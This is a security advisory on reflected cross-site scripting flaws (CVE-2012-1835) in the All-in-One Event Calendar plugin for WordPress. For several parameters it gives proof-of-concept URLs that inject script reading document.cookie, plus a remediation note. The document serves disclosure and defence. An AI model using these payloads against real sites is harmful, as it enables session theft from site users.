Advisory Details:

High-Tech Bridge SA Security Research Lab has discovered multiple vulnerabilities in All-in-One Event Calendar Plugin for WordPress, which can be exploited to perform Cross-Site Scripting (XSS) attacks.

1) Cross-Site Scripting (XSS) in All-in-One Event Calendar Plugin for WordPress: CVE-2012-1835

1.1 Input passed via the "title" GET parameter to /wp-content/plugins/all-in-one-event-calendar/app/view/agenda-widget-form.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in user's browser session in context of the affected website.

The following PoC (Proof of Concept) demonstrates the vulnerability:

http://wp/wp-content/plugins/all-in-one-event-calendar/app/view/agenda-widget-form.php?title[id]=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

1.2 Input passed via the "args", "title", "before_title", "after_title" GET parameters to /wp-content/plugins/all-in-one-event-calendar/app/view/agenda-widget.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in user's browser session in context of the affected website.

The following PoC (Proof of Concept) demonstrate the vulnerabilities:

http://wp/wp-content/plugins/all-in-one-event-calendar/app/view/agenda-widget.php?args[before_widget]=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://wp/wp-content/plugins/all-in-one-event-calendar/app/view/agenda-widget.php?title=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://wp/wp-content/plugins/all-in-one-event-calendar/app/view/agenda-widget.php?title=1&before_title=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://wp/wp-content/plugins/all-in-one-event-calendar/app/view/agenda-widget.php?title=1&after_title=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

1.3 Input passed via the "button_value" GET parameter to /wp-content/plugins/all-in-one-event-calendar/app/view/box_publish_button.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in user's browser session in context of the affected website.

The following PoC (Proof of Concept) demonstrates the vulnerability:

http://wp/wp-content/plugins/all-in-one-event-calendar/app/view/box_publish_button.php?button_value=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

1.4 Input passed via the "msg" GET parameter to /wp-content/plugins/all-in-one-event-calendar/app/view/save_successful.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in user's browser session in context of the affected website.

The following PoC (Proof of Concept) demonstrates the vulnerability:

http://wp/wp-content/plugins/all-in-one-event-calendar/app/view/save_successful.php?msg=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

Successful exploitation of these vulnerabilities (1.1-1.4) requires that "register_globals" is enabled.

-----------------------------------------------------------------------------------------------

Solution:

Currently we are not aware of any vendor-supplied patches or other solutions.
Edit the application source code to ensure that input is properly sanitised.
